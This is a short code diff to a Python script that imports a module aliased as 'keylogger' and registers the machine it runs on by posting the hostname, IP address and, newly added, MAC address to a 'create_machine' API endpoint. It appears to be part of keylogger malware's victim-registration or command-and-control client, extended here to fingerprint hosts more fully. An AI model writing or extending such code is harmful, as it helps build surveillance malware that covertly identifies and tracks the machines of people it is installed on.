@@ -1,14 +1,17 @@
 import manager as keylogger
 import requests,socket
-
+import uuid
 url = 'http://127.0.0.1:9734/api/create_machine'
 
 
 def create_logger():
     hostname = socket.gethostname()
     ipaddress = socket.gethostbyname(hostname)
+    mac_address = hex(uuid.getnode())
     data = {
-        "ip": ipaddress
+        "host name": hostname,
+        "ip": ipaddress,
+        "mac address": mac_address
     }
     try:
         response = requests.post(url, json=data)
